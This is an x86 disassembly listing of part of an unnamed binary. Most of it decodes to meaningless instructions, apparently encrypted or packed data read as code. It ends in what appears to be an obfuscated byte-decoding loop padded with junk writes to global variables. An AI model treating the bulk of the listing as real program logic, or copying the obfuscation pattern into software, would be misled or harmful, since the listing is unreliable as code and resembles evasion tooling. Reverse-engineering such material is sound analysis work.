  41bc92:	ds push 0xffffffae
  41bc95:	sub    BYTE PTR [eax],bl
  41bc97:	ins    BYTE PTR es:[edi],dx
  41bc98:	aam    0x79
  41bc9a:	and    eax,0xbd14f7e3
  41bc9f:	mov    ebp,0x5501e3b
  41bca4:	cwde   
  41bca5:	in     al,0x76
  41bca7:	gs stos BYTE PTR es:[edi],al
  41bca9:	mov    ebx,0x5d2703ee
  41bcae:	mov    bl,0x7b
  41bcb0:	push   es
  41bcb1:	xor    ah,0xc1
  41bcb4:	lds    edi,FWORD PTR [esi-0x6128f097]
  41bcba:	imul   esi,DWORD PTR [bp+si-0x497],0xffffff83
  41bcc0:	in     eax,0xe5
  41bcc2:	mov    ?,WORD PTR [esi]
  41bcc4:	mov    al,0x39
  41bcc6:	dec    esp
  41bcc7:	sar    BYTE PTR [ecx+eax*8+0x9],0xa5
  41bccc:	pop    esp
  41bccd:	jmp    0xc425:0xbc84543e
  41bcd4:	sbb    al,0xb5
  41bcd6:	push   ds
  41bcd7:	sbb    eax,0x586a5b9e
  41bcdc:	imul   DWORD PTR [eax+eiz*4+0x23ce4638]
  41bce3:	into   
  41bce4:	or     al,0x25
  41bce6:	cwde   
  41bce7:	fnstenv [ebp+0x30084019]
  41bced:	hlt    
  41bcee:	pop    eax
  41bcef:	enter  0x9b,0xb
  41bcf3:	push   ebx
  41bcf4:	mov    al,ds:0x6779d62d
  41bcf9:	or     esp,edx
  41bcfb:	xor    dh,bh
  41bcfd:	addr16 pop ebx
  41bcff:	or     BYTE PTR [ecx],dl
  41bd01:	push   ebp
  41bd02:	pop    ds
  41bd03:	push   0xffffffa5
  41bd05:	jmp    0x41bd59
  41bd07:	bnd jge 0x41bd3f
  41bd0a:	jg     0x41bd47
  41bd0c:	cld    
  41bd0d:	fbld   TBYTE PTR [edx+0x4c934b2e]
  41bd13:	jge    0x41bd4e
  41bd15:	mov    al,ds:0x240e5736
  41bd1a:	div    BYTE PTR [eax+ecx*2+0x4f]
  41bd1e:	mov    ebp,0xe1fd2176
  41bd23:	retf   0x815f
  41bd26:	inc    esi
  41bd27:	sbb    BYTE PTR [edx+0x46],0x9c
  41bd2b:	jp     0x41bd81
  41bd2d:	scas   al,BYTE PTR es:[edi]
  41bd2e:	ror    DWORD PTR [ebp+ecx*1-0x4fa5f011],1
  41bd35:	in     eax,0x3d
  41bd37:	pop    ebp
  41bd38:	or     dl,ch
  41bd3a:	pminsw mm0,mm6
  41bd3d:	test   BYTE PTR [ebx+0x2b233c6e],al
  41bd43:	xor    al,0x89
  41bd45:	mov    bh,0xb0
  41bd47:	cmp    DWORD PTR [ebx-0x7ec8121c],edi
  41bd4d:	and    DWORD PTR [esi+0x428bb32d],ebx
  41bd53:	mov    ebp,0x2b8c5bec
  41bd58:	sub    DWORD PTR [esi],ebx
  41bd5a:	fild   WORD PTR [edi]
  41bd5c:	mov    ebx,0xb18737c9
  41bd61:	pusha  
  41bd62:	sub    ch,BYTE PTR [edx+ecx*8]
  41bd65:	ins    DWORD PTR es:[edi],dx
  41bd66:	ins    DWORD PTR es:[edi],dx
  41bd67:	push   cs
  41bd68:	cmp    al,0x53
  41bd6a:	fild   WORD PTR ss:[ebp-0x12]
  41bd6e:	pop    eax
  41bd6f:	bound  edx,QWORD PTR [ebx-0x7c9a061d]
  41bd75:	jo     0x41bd0e
  41bd77:	(bad)
  41bd7a:	xlat   BYTE PTR ds:[ebx]
  41bd7b:	jnp    0x41bd42
  41bd7d:	ja     0x41bd15
  41bd7f:	add    dl,al
  41bd81:	inc    ecx
  41bd82:	add    edi,DWORD PTR [eax]
  41bd84:	dec    esi
  41bd85:	mov    ds:0xb5b6ac11,al
  41bd8a:	pop    ds
  41bd8b:	scas   al,BYTE PTR es:[edi]
  41bd8c:	outs   dx,DWORD PTR ds:[esi]
  41bd8d:	dec    edi
  41bd8e:	mov    al,0xae
  41bd90:	adc    eax,0xde41a7a7
  41bd95:	ins    DWORD PTR es:[edi],dx
  41bd96:	mov    ecx,0xd821629d
  41bd9b:	mov    bh,BYTE PTR [ebx+eiz*1]
  41bd9e:	out    dx,al
  41bd9f:	sar    DWORD PTR [edx+esi*4-0x21],1
  41bda3:	sar    DWORD PTR [edi+0x73],cl
  41bda6:	and    al,0xa7
  41bda8:	clc    
  41bda9:	test   al,0xc2
  41bdab:	or     DWORD PTR [eax],edx
  41bdad:	or     BYTE PTR [eax+ebx*4],dl
  41bdb0:	mov    ecx,0xfac3c2db
  41bdb5:	fistp  QWORD PTR [ecx+0x49]
  41bdb8:	mov    esp,0x232990ab
  41bdbd:	repz (bad) 
  41bdbf:	push   esp
  41bdc0:	stos   DWORD PTR es:[edi],eax
  41bdc1:	jnp    0x41bd4a
  41bdc3:	xor    esp,DWORD PTR [esi-0x58927e]
  41bdc9:	jp     0x41bd52
  41bdcb:	pushf  
  41bdcc:	mov    esi,0x7bf5aed5
  41bdd1:	and    DWORD PTR [ecx+0x29dc68e9],esi
  41bdd7:	xor    cl,BYTE PTR [edx-0x30d746b4]
  41bddd:	inc    eax
  41bdde:	addr16 and al,0x34
  41bde1:	mov    ecx,0x29e20726
  41bde6:	mov    esp,edi
  41bde8:	push   esi
  41bde9:	push   DWORD PTR [ebp+0x45a549bd]
  41bdef:	mov    dh,0x38
  41bdf1:	cmp    BYTE PTR [ecx+ecx*1+0x5f7322df],cl
  41bdf8:	adc    al,0x2a
  41bdfa:	icebp  
  41bdfb:	dec    esp
  41bdfc:	sbb    al,0x48
  41bdfe:	je     0x41bdb9
  41be00:	fild   WORD PTR [ebx]
  41be02:	outs   dx,DWORD PTR ds:[esi]
  41be03:	mov    eax,ds:0x3c20c113
  41be08:	jno    0x41bdf8
  41be0a:	in     al,0xbf
  41be0c:	scas   eax,DWORD PTR es:[edi]
  41be0d:	(bad)  [edx+ecx*1-0x3723c696]
  41be14:	rcl    BYTE PTR [ebx],1
  41be16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be17:	ret    0xcc48
  41be1a:	loope  0x41bdbe
  41be1c:	sub    DWORD PTR [ebx+0x17],esp
  41be1f:	xchg   ecx,eax
  41be20:	and    BYTE PTR ds:0xa757dbf0,ch
  41be26:	xor    BYTE PTR [ecx],0xde
  41be29:	mov    DWORD PTR [edi-0x165a352f],esi
  41be2f:	es pop eax
  41be31:	pushf  
  41be32:	jo     0x41be97
  41be34:	or     bh,ch
  41be36:	xor    DWORD PTR [eax],0x3d25d6a9
  41be3c:	out    dx,eax
  41be3d:	pop    esp
  41be3e:	shr    BYTE PTR [eax+0x3],cl
  41be41:	fst    QWORD PTR [edi-0x599b213a]
  41be47:	fisttp QWORD PTR ds:0xdad69ca8
  41be4d:	cmp    esi,DWORD PTR [edx-0x5f]
  41be50:	sbb    ch,BYTE PTR [eax-0x1a]
  41be53:	ret    0xe8ea
  41be56:	fild   QWORD PTR [esi+0x57]
  41be59:	inc    edi
  41be5a:	out    dx,eax
  41be5b:	xor    DWORD PTR [edx-0x6c],ebx
  41be5e:	xor    eax,0x8c14818
  41be63:	xor    eax,0x6600dbb4
  41be68:	scas   al,BYTE PTR es:[edi]
  41be69:	aad    0x96
  41be6b:	rsqrtps xmm0,XMMWORD PTR [eax]
  41be6e:	div    BYTE PTR [eax+0x29e7a0a8]
  41be74:	cmc    
  41be75:	mov    eax,ds:0x7563df2b
  41be7a:	cmc    
  41be7b:	iret   
  41be7c:	fisubr DWORD PTR [edx-0x14]
  41be7f:	data16 shl BYTE PTR [edi],0xec
  41be83:	aaa    
  41be84:	(bad)  
  41be86:	mov    bh,0x34
  41be88:	adc    DWORD PTR [ecx-0x2f],esi
  41be8b:	adc    al,0x86
  41be8d:	std    
  41be8e:	adc    DWORD PTR [esp+ecx*1+0x19ced431],edi
  41be95:	mov    edi,0x71ecb8c3
  41be9a:	or     cl,BYTE PTR [esi+0x59f0337e]
  41bea0:	stc    
  41bea1:	std    
  41bea2:	retf   0x2ab4
  41bea5:	(bad)  
  41bea6:	mov    ebp,0x1fc0c72e
  41beab:	ss sub ebx,esi
  41beae:	test   DWORD PTR [ebx-0x76d767e9],esi
  41beb4:	add    cl,bh
  41beb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb7:	jecxz  0x41bea4
  41beb9:	loopne 0x41bf0b
  41bebb:	adc    ah,BYTE PTR [ebp+0x41818e5c]
  41bec1:	ja     0x41be52
  41bec3:	pop    eax
  41bec4:	xchg   DWORD PTR [edi+0x249c8d9a],ebx
  41beca:	mov    ds:0x8a9338d0,al
  41becf:	xchg   DWORD PTR ds:0xa05cd261,ebx
  41bed5:	xchg   ebx,eax
  41bed6:	out    0x69,al
  41bed8:	gs daa 
  41beda:	sti    
  41bedb:	dec    eax
  41bedc:	or     eax,0x17ce7fd9
  41bee1:	dec    ecx
  41bee2:	or     BYTE PTR [ecx],dh
  41bee4:	or     al,0x98
  41bee6:	hlt    
  41bee7:	or     BYTE PTR [edx-0x435669df],bl
  41beed:	xchg   esi,eax
  41beee:	out    0x8e,eax
  41bef0:	push   edx
  41bef1:	scas   al,BYTE PTR es:[edi]
  41bef2:	(bad)  
  41bef3:	js     0x41bf5b
  41bef5:	dec    esp
  41bef6:	jl     0x41bef3
  41bef8:	mov    eax,ds:0x11026370
  41befd:	retf   0x38b2
  41bf00:	mov    eax,0x555fab27
  41bf05:	mov    eax,0x4415d952
  41bf0a:	or     al,0xc9
  41bf0c:	push   ds
  41bf0d:	bound  edi,QWORD PTR fs:[esi]
  41bf10:	fld    st(5)
  41bf12:	mov    edx,0x8e34fc85
  41bf17:	xchg   edx,eax
  41bf18:	sbb    ebx,DWORD PTR [edx-0x3c]
  41bf1b:	lds    edi,FWORD PTR [edi]
  41bf1d:	cli    
  41bf1e:	or     ch,BYTE PTR [ebx-0x41ca4788]
  41bf24:	lods   eax,DWORD PTR ds:[esi]
  41bf25:	(bad)  [edx-0x4b56006a]
  41bf2b:	mov    esp,0x59ff0dcf
  41bf30:	push   esp
  41bf31:	inc    edx
  41bf32:	fld    QWORD PTR [ebx-0x31126e0a]
  41bf38:	lock jns 0x41bf95
  41bf3b:	pop    edi
  41bf3c:	lock lds ebp,FWORD PTR fs:[edi+0x7d5cd23f]
  41bf44:	mov    ebp,0x4da084e0
  41bf49:	or     DWORD PTR [edi+0x71d23aff],esp
  41bf4f:	aam    0x8c
  41bf51:	mov    dl,BYTE PTR [eax+ecx*1+0x6b]
  41bf55:	mov    ebp,0xd7d4ec93
  41bf5a:	xor    BYTE PTR [edi-0x3f],al
  41bf5d:	pusha  
  41bf5e:	mov    edx,0xcb4ed4d8
  41bf63:	(bad)  [edx+edi*8+0x39]
  41bf67:	retf   0x5203
  41bf6a:	leave  
  41bf6b:	sub    DWORD PTR [ebx-0xa0137e5],esp
  41bf71:	sbb    eax,DWORD PTR [eax-0x68e0d2b8]
  41bf77:	test   DWORD PTR [ebx+0x3f],esp
  41bf7a:	int3   
  41bf7b:	xchg   esp,eax
  41bf7c:	mov    eax,ds:0x62156706
  41bf81:	(bad)  
  41bf82:	mov    bh,0xe5
  41bf84:	ud1    esp,esi
  41bf87:	mov    ch,BYTE PTR [ecx+0x2]
  41bf8a:	push   es
  41bf8b:	fwait
  41bf8c:	jp     0x41bf99
  41bf8e:	int    0x28
  41bf90:	sub    eax,0xb9487656
  41bf95:	jmp    0xb3e1:0x72215f80
  41bf9c:	xchg   ebx,eax
  41bf9d:	ja     0x41bf91
  41bf9f:	jmp    0xb5fc9bc7
  41bfa4:	popf   
  41bfa5:	inc    esi
  41bfa6:	push   ecx
  41bfa7:	adc    eax,0x67b66f5
  41bfac:	fist   DWORD PTR [ebx+ebx*8]
  41bfaf:	jae    0x41bfb3
  41bfb1:	sub    BYTE PTR [ebx+ebx*2-0x30],dl
  41bfb5:	repnz clc 
  41bfb7:	sbb    bl,BYTE PTR [ebx]
  41bfb9:	das    
  41bfba:	cmp    al,al
  41bfbc:	outs   dx,BYTE PTR ds:[esi]
  41bfbd:	fwait
  41bfbe:	pushf  
  41bfbf:	mov    edi,0x14cf40d1
  41bfc4:	ja     0x41c013
  41bfc6:	hlt    
  41bfc7:	les    ecx,FWORD PTR [ebp+esi*2-0x6f]
  41bfcb:	imul   ecx,DWORD PTR [edx-0x6a],0x9db93d0a
  41bfd2:	inc    ebp
  41bfd3:	xchg   DWORD PTR [edi+0xe],ebx
  41bfd6:	mov    ebp,0x5d40e45f
  41bfdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfdc:	pop    edi
  41bfdd:	xor    eax,0x746ae9b3
  41bfe2:	or     ebx,DWORD PTR [esi+0x5933aa6]
  41bfe8:	mov    ss:0x97d54dca,al
  41bfee:	mov    edi,0x835a7b
  41bff3:	ins    BYTE PTR es:[edi],dx
  41bff4:	jmp    0x41bfdd
  41bff6:	mov    ebp,0xc165bfdc
  41bffb:	mov    eax,ds:0x3df662fd
  41c000:	adc    BYTE PTR [ebp+0x2f],bh
  41c003:	pop    ds
  41c004:	jp     0x41c039
  41c006:	mov    WORD PTR [edi-0x3523e11c],gs
  41c00c:	cmp    ebx,DWORD PTR [esi+0x3d4d1309]
  41c012:	inc    edx
  41c013:	mov    ecx,0xca18c887
  41c018:	aas    
  41c019:	ror    DWORD PTR [ecx-0x5cf2cd73],0xd8
  41c020:	sbb    eax,0x904ff301
  41c025:	xchg   esi,eax
  41c026:	jno    0x41c06a
  41c028:	push   es
  41c029:	shl    BYTE PTR [edx],1
  41c02b:	sbb    eax,ebp
  41c02d:	scas   eax,DWORD PTR es:[edi]
  41c02e:	push   ss
  41c02f:	fmul   DWORD PTR [ebx+esi*4+0x31]
  41c033:	inc    edx
  41c034:	mov    al,0x47
  41c036:	push   ds
  41c037:	or     al,0x3c
  41c039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c03a:	mov    ah,0xa1
  41c03c:	mov    ecx,0xd47cd076
  41c041:	into   
  41c042:	scas   eax,DWORD PTR es:[edi]
  41c043:	aaa    
  41c044:	mov    dl,0x61
  41c046:	arpl   WORD PTR [esi],di
  41c048:	sar    BYTE PTR [esi+0x2d3ec512],0x7c
  41c04f:	dec    eax
  41c050:	cdq    
  41c051:	mul    edx
  41c053:	inc    edi
  41c054:	push   eax
  41c055:	sub    bh,cl
  41c057:	sbb    eax,DWORD PTR [eax]
  41c059:	sti    
  41c05a:	jno    0x41c033
  41c05c:	mov    eax,0x907123e9
  41c061:	mov    esi,0xc90da4ca
  41c066:	icebp  
  41c067:	xor    al,0xe6
  41c069:	pop    ecx
  41c06a:	pop    edx
  41c06b:	pop    es
  41c06c:	loope  0x41c0d9
  41c06e:	int3   
  41c06f:	sahf   
  41c070:	repnz adc eax,0xa95e608
  41c076:	sub    esi,DWORD PTR [ebp+0x4a]
  41c079:	mov    WORD PTR ds:0x42f90a66,ds
  41c07f:	sahf   
  41c080:	test   bl,cl
  41c082:	test   DWORD PTR [esi+0x11a6b14f],edi
  41c088:	pop    ecx
  41c089:	icebp  
  41c08a:	cmp    ch,BYTE PTR [eax-0x3da90deb]
  41c090:	cdq    
  41c091:	jmp    0xd47c:0xa2c2633b
  41c098:	cs push 0xffffffd8
  41c09b:	xchg   ecx,eax
  41c09c:	cli    
  41c09d:	xchg   esp,eax
  41c09e:	sub    eax,0xc100a330
  41c0a4:	in     eax,dx
  41c0a5:	daa    
  41c0a6:	mov    bh,0x85
  41c0a8:	jmp    0x172389ee
  41c0ad:	pop    ecx
  41c0ae:	mov    cl,0x7d
  41c0b0:	push   ebp
  41c0b1:	mov    eax,0x20403031
  41c0b6:	jo     0x41c05b
  41c0b8:	dec    ebx
  41c0b9:	adc    al,0x86
  41c0bb:	push   esi
  41c0bc:	add    BYTE PTR [eax+0x7a],cl
  41c0bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0c0:	sar    DWORD PTR [eax+0xaf086d7],cl
  41c0c6:	je     0x41c05b
  41c0c8:	out    dx,eax
  41c0c9:	sub    bl,BYTE PTR [edi-0x78]
  41c0cc:	adc    bl,BYTE PTR [ebx]
  41c0ce:	push   esi
  41c0cf:	mov    bl,0x1b
  41c0d1:	inc    ecx
  41c0d2:	add    BYTE PTR [esi],0xa8
  41c0d5:	aas    
  41c0d6:	pusha  
  41c0d7:	push   es
  41c0d8:	adc    eax,0x9709f7c0
  41c0dd:	popf   
  41c0de:	adc    BYTE PTR [esi-0x46],ah
  41c0e1:	pop    es
  41c0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e3:	pop    eax
  41c0e4:	inc    edx
  41c0e5:	fs and al,0x73
  41c0e8:	push   0x7a
  41c0ea:	loopne 0x41c0ab
  41c0ec:	add    cl,BYTE PTR [ecx+0x3e]
  41c0ef:	inc    esp
  41c0f0:	xchg   ebx,eax
  41c0f1:	lea    edi,[edi-0x451b2693]
  41c0f7:	repnz ds xor eax,0x66956d66
  41c0fe:	cmp    bh,BYTE PTR [edx-0xcf9bde1]
  41c104:	enter  0x19f8,0x95
  41c108:	out    dx,al
  41c109:	int3   
  41c10a:	outs   dx,DWORD PTR ds:[esi]
  41c10b:	out    dx,al
  41c10c:	mov    edx,0xdd329ab5
  41c111:	push   ecx
  41c112:	ins    BYTE PTR es:[edi],dx
  41c113:	div    DWORD PTR [esi]
  41c115:	jnp    0x41c130
  41c117:	in     eax,0xc1
  41c119:	retf   
  41c11a:	js     0x41c144
  41c11c:	or     DWORD PTR [esi],esi
  41c11e:	test   bl,dl
  41c120:	push   edx
  41c121:	push   esi
  41c122:	and    DWORD PTR [eax-0x1179e64e],ecx
  41c128:	and    edx,esp
  41c12a:	pusha  
  41c12b:	fcmovnb st,st(7)
  41c12d:	fdivrp st(1),st
  41c12f:	xchg   DWORD PTR [ebp-0x24],eax
  41c132:	sti    
  41c133:	mov    ebx,0xf4224993
  41c138:	xchg   esp,eax
  41c139:	xchg   ecx,eax
  41c13a:	dec    eax
  41c13b:	in     al,0xe6
  41c13d:	jmp    0x41c196
  41c13f:	sbb    BYTE PTR [esi-0x5002ced1],dh
  41c145:	loopne 0x41c0d8
  41c147:	xchg   esp,eax
  41c148:	inc    esi
  41c149:	mov    ebx,0x84106cff
  41c14e:	call   0xfca0:0x440ac44
  41c155:	or     al,BYTE PTR [edx+0x3862abf4]
  41c15b:	aad    0xfd
  41c15d:	push   0x29bac587
  41c162:	pop    edi
  41c163:	in     al,0x4c
  41c165:	(bad)  
  41c166:	adc    ah,BYTE PTR [ebx+0x10b6aaf]
  41c16c:	push   eax
  41c16d:	mov    dl,0xfb
  41c16f:	fld    DWORD PTR [ebx-0x3b2783aa]
  41c175:	dec    ecx
  41c176:	adc    bh,BYTE PTR [ebx+0xc]
  41c179:	push   edi
  41c17a:	push   ebx
  41c17b:	jecxz  0x41c18f
  41c17d:	add    BYTE PTR es:[esi+edx*2],cl
  41c181:	mov    eax,0xdbb8dbf6
  41c186:	shr    WORD PTR [edi],cl
  41c189:	add    ch,BYTE PTR [esi]
  41c18b:	(bad)  
  41c18c:	and    dh,BYTE PTR ds:0x6dbcd53a
  41c192:	cmc    
  41c193:	and    eax,0x9d1e6ee2
  41c198:	add    al,0x5c
  41c19a:	dec    ebx
  41c19b:	retf   
  41c19c:	pop    esp
  41c19d:	out    dx,eax
  41c19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c19f:	mov    ah,0xa2
  41c1a1:	iret   
  41c1a2:	ret    0xd026
  41c1a5:	sub    ch,ch
  41c1a7:	(bad)  
  41c1a8:	(bad)  
  41c1a9:	xchg   DWORD PTR [esi],ebx
  41c1ab:	out    0x27,eax
  41c1ad:	add    ebp,ebx
  41c1af:	jae    0x41c19b
  41c1b1:	(bad)  
  41c1b2:	pusha  
  41c1b3:	push   0xbf63642b
  41c1b8:	into   
  41c1b9:	call   0x72041c93
  41c1be:	aas    
  41c1bf:	and    DWORD PTR ss:[ecx+0x2c],0x33fed9bf
  41c1c7:	in     eax,dx
  41c1c8:	(bad)  
  41c1c9:	aam    0x49
  41c1cb:	fisttp DWORD PTR [eax+edi*2-0x4767348d]
  41c1d2:	stos   DWORD PTR es:[edi],eax
  41c1d3:	mov    ebp,0xebbf41f7
  41c1d8:	pop    ebx
  41c1d9:	in     al,0x2a
  41c1db:	push   esi
  41c1dc:	mov    esp,0xe371da5e
  41c1e1:	pop    es
  41c1e2:	lds    ebp,FWORD PTR [eax]
  41c1e4:	aad    0xc9
  41c1e6:	inc    ebx
  41c1e7:	fcmove st,st(4)
  41c1e9:	xor    eax,0x35bf4f60
  41c1ee:	push   0xffffff9f
  41c1f0:	icebp  
  41c1f1:	inc    eax
  41c1f2:	mov    dh,0xad
  41c1f4:	ffree  st(4)
  41c1f6:	push   0x40f64c28
  41c1fb:	sbb    eax,0xc28ff9f7
  41c200:	pop    edi
  41c201:	jp     0x41c205
  41c203:	pop    ss
  41c204:	loope  0x41c249
  41c206:	int3   
  41c207:	xchg   ebp,eax
  41c208:	in     al,dx
  41c209:	leave  
  41c20a:	les    edi,FWORD PTR [ecx+esi*4]
  41c20d:	xchg   ecx,eax
  41c20e:	call   0x2fc7:0x68797c27
  41c215:	jns    0x41c228
  41c217:	scas   al,BYTE PTR es:[edi]
  41c218:	adc    cl,BYTE PTR [edi+ebp*8-0x19]
  41c21c:	outs   dx,DWORD PTR ds:[esi]
  41c21d:	in     eax,dx
  41c21e:	pop    ebx
  41c21f:	lea    ebx,[edx]
  41c221:	nop
  41c222:	sbb    ecx,0x78faec70
  41c228:	lock stos BYTE PTR es:[edi],al
  41c22a:	add    edi,ecx
  41c22c:	xor    al,0x57
  41c22e:	dec    ecx
  41c22f:	push   cs
  41c230:	mov    ah,0x2e
  41c232:	aam    0xeb
  41c234:	shr    DWORD PTR [edx],1
  41c236:	jmp    0x41c2a8
  41c238:	into   
  41c239:	inc    ecx
  41c23a:	jecxz  0x41c250
  41c23c:	adc    al,0x61
  41c23e:	add    bl,BYTE PTR [edx+ebp*4]
  41c241:	test   BYTE PTR [edx-0x10],ch
  41c244:	sahf   
  41c245:	gs cli 
  41c247:	test   al,0x20
  41c249:	mov    edx,0xaf09477e
  41c24e:	inc    ebx
  41c24f:	mov    bl,0x18
  41c251:	(bad)  
  41c253:	pop    eax
  41c254:	lods   al,BYTE PTR ds:[esi]
  41c255:	int    0x7
  41c257:	popf   
  41c258:	sbb    al,0xef
  41c25a:	gs cwde 
  41c25c:	or     dh,BYTE PTR [eax]
  41c25e:	sub    ebx,DWORD PTR [ebx+0x2a001d89]
  41c264:	(bad)  
  41c265:	je     0x41c250
  41c267:	lock ret 0xa7db
  41c26b:	mov    ds:0xff5ca9b,al
  41c270:	int    0xe5
  41c272:	adc    eax,0x52fc79e6
  41c277:	(bad)  
  41c278:	mov    esp,0xfed6827
  41c27d:	test   DWORD PTR ds:0xc51b994c,edx
  41c283:	jmp    0x699c:0x86d1eed2
  41c28a:	ins    BYTE PTR es:[edi],dx
  41c28b:	dec    esi
  41c28c:	pop    ecx
  41c28d:	jb     0x41c2dc
  41c28f:	scas   eax,DWORD PTR es:[edi]
  41c290:	ret    
  41c291:	xchg   BYTE PTR ss:[edi+0x1c59f495],al
  41c298:	sbb    dh,dh
  41c29a:	xlat   BYTE PTR ds:[ebx]
  41c29b:	mov    dl,0x43
  41c29d:	ret    0xf2c8
  41c2a0:	pusha  
  41c2a1:	jl     0x41c294
  41c2a3:	inc    ecx
  41c2a4:	and    bh,bh
  41c2a6:	cli    
  41c2a7:	std    
  41c2a8:	and    al,0x10
  41c2aa:	mov    ah,0x47
  41c2ac:	xor    DWORD PTR [edx-0x3],esp
  41c2af:	dec    edx
  41c2b0:	or     al,BYTE PTR [edx-0x1f61de0d]
  41c2b6:	call   0x6fcff8e7
  41c2bb:	mov    ah,0x5d
  41c2bd:	mov    ah,0x37
  41c2bf:	sbb    al,0x8
  41c2c1:	sahf   
  41c2c2:	sbb    BYTE PTR [eax-0x77],bl
  41c2c5:	fs mov dh,0x10
  41c2c8:	scas   eax,DWORD PTR es:[edi]
  41c2c9:	aad    0xf9
  41c2cb:	out    dx,al
  41c2cc:	mov    ah,0xd9
  41c2ce:	sub    cl,BYTE PTR [ebp+0xe]
  41c2d1:	fst    DWORD PTR [ebx-0x54]
  41c2d4:	jmp    0x518e73b2
  41c2d9:	xchg   ecx,ebp
  41c2db:	mov    bl,0xf7
  41c2dd:	mov    edi,ebp
  41c2df:	in     eax,dx
  41c2e0:	out    0x7c,eax
  41c2e2:	clc    
  41c2e3:	dec    BYTE PTR [esi]
  41c2e5:	dec    esi
  41c2e6:	mov    ecx,0x64f98633
  41c2eb:	xor    bh,dl
  41c2ed:	xchg   edi,eax
  41c2ee:	das    
  41c2ef:	fistp  WORD PTR [edi]
  41c2f1:	add    bh,dl
  41c2f3:	sbb    bh,bl
  41c2f5:	popa   
  41c2f6:	int3   
  41c2f7:	mov    DWORD PTR [edx-0x53],edi
  41c2fa:	ja     0x41c31d
  41c2fc:	(bad)  
  41c2fd:	mov    WORD PTR [edx+0x7e],?
  41c300:	inc    eax
  41c301:	gs (bad) 
  41c303:	or     edx,DWORD PTR [eax-0x507739b1]
  41c309:	(bad)  
  41c30a:	jp     0x41c2bc
  41c30c:	xor    ah,dh
  41c30e:	xchg   DWORD PTR [ebp+0x3191c406],ecx
  41c314:	inc    eax
  41c315:	int    0x6a
  41c317:	inc    eax
  41c318:	fsub   QWORD PTR [edi+ebp*4+0x4e]
  41c31c:	push   ebx
  41c31d:	fisub  DWORD PTR [esi-0x7468bc5b]
  41c323:	in     eax,dx
  41c324:	mov    esi,0xac339dd7
  41c329:	inc    ebx
  41c32a:	pop    ecx
  41c32b:	dec    edx
  41c32c:	leave  
  41c32d:	pop    ss
  41c32e:	std    
  41c32f:	cmp    bl,bh
  41c331:	mov    gs,WORD PTR [ebx]
  41c333:	xchg   DWORD PTR [eax+eax*1],edi
  41c336:	pop    edi
  41c337:	out    0x63,al
  41c339:	jecxz  0x41c305
  41c33b:	es js  0x41c377
  41c33e:	daa    
  41c33f:	jnp    0x41c322
  41c341:	mov    ds:0x511baa4e,al
  41c346:	lock jbe 0x41c316
  41c349:	inc    edi
  41c34a:	dec    esp
  41c34b:	xchg   DWORD PTR [eax+edi*4],ebp
  41c34e:	mov    ebx,DWORD PTR [ecx-0x2c]
  41c351:	stc    
  41c352:	inc    ecx
  41c353:	mov    ah,0xd
  41c355:	or     eax,0x5cd957de
  41c35a:	xor    eax,0x9169cf6f
  41c35f:	mov    ebx,0x5b045908
  41c364:	stos   BYTE PTR es:[edi],al
  41c365:	repz mov eax,ds:0x9b9cf855
  41c36b:	sub    cl,BYTE PTR ds:[eax+0x58ef63e1]
  41c372:	sub    cl,BYTE PTR [eax-0x6d]
  41c375:	adc    DWORD PTR [eax+edi*2-0x31],ebx
  41c379:	sbb    eax,DWORD PTR cs:[eax+0x78]
  41c37d:	fstp   DWORD PTR [ebx-0x51]
  41c380:	push   ebx
  41c381:	es (bad) 
  41c383:	jmp    0xcdc6:0xe2bfba3a
  41c38a:	lods   eax,DWORD PTR ds:[esi]
  41c38b:	mov    edi,0x25823040
  41c390:	mov    ah,ch
  41c392:	or     dl,cl
  41c394:	and    eax,0xab86f325
  41c399:	test   DWORD PTR [eax+0x3d],eax
  41c39c:	sub    al,ch
  41c39e:	jno    0x77af3bb8
  41c3a4:	sub    al,0x3f
  41c3a6:	and    ecx,ebp
  41c3a8:	sbb    BYTE PTR [ebp+0x6c],dl
  41c3ab:	stc    
  41c3ac:	(bad)  [edx+0xa]
  41c3af:	jmp    0x41c33a
  41c3b1:	mov    bh,0x78
  41c3b3:	mov    ebp,0x5459ce6b
  41c3b8:	mov    ebp,0x1f967dac
  41c3bd:	push   0x55b5a6f1
  41c3c2:	push   edx
  41c3c3:	lock sbb al,0xac
  41c3c6:	mov    eax,0x85b95ed5
  41c3cb:	mov    al,BYTE PTR [eax]
  41c3cd:	add    BYTE PTR [ecx+0x42c00c1d],al
  41c3d3:	add    BYTE PTR [eax+eiz*4],bl
  41c3d6:	inc    edx
  41c3d7:	add    BYTE PTR [esi+0x33],ah
  41c3da:	dec    esp
  41c3db:	xchg   edi,eax
  41c3dc:	add    al,BYTE PTR [ecx+0x42800425]
  41c3e2:	add    BYTE PTR [edx+0x29],bh
  41c3e5:	add    BYTE PTR [eax],al
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
